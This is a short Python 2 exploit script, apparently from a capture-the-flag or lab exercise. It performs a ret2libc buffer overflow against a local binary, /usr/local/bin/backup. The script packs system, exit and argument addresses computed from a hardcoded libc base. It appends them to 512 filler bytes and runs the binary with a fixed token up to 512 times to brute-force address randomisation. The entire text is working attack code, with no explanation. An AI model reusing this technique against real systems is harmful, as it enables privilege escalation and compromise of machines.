from subprocess import call
import struct

libc_base_addr = 0xf75b0000

system_offset = 0x0003a940
exit_offset = 0x0002e7d0
arg_offset = 0x00015900b

system_addr = struct.pack("<I",libc_base_addr+system_offset)
exit_addr = struct.pack("<I",libc_base_addr+exit_offset)
arg_addr = struct.pack("<I",libc_base_addr+arg_offset)

buf = "A" * 512
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
    print "Try: %s" %i
    i += 1
    ret = call(["/usr/local/bin/backup","abc","45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474",buf])
